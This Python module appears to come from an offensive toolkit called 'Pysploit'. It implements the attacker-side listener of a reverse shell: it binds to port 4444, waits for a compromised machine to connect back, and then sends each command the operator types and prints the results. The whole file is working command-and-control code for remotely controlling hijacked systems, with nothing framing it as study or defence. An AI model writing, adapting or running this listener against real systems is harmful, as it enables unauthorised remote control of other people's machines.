# modules/handler.py

import socket

def start_listener(host='0.0.0.0', port=4444):
    server = socket.socket()
    server.bind((host, port))
    server.listen(1)

    print(f"\033[92m[+] Listening on {host}:{port}...\033[0m")
    client, addr = server.accept()
    print(f"\033[92m[+] Connection from {addr}\033[0m")

    while True:
        try:
            command = input("Pysploit Shell > ")
            if command.lower() == "exit":
                client.send(b'exit')
                break
            client.send(command.encode())
            result = client.recv(4096).decode()
            print(result)
        except Exception as e:
            print(f"\033[91m[-] Error: {e}\033[0m")
            break

    client.close()
    server.close()
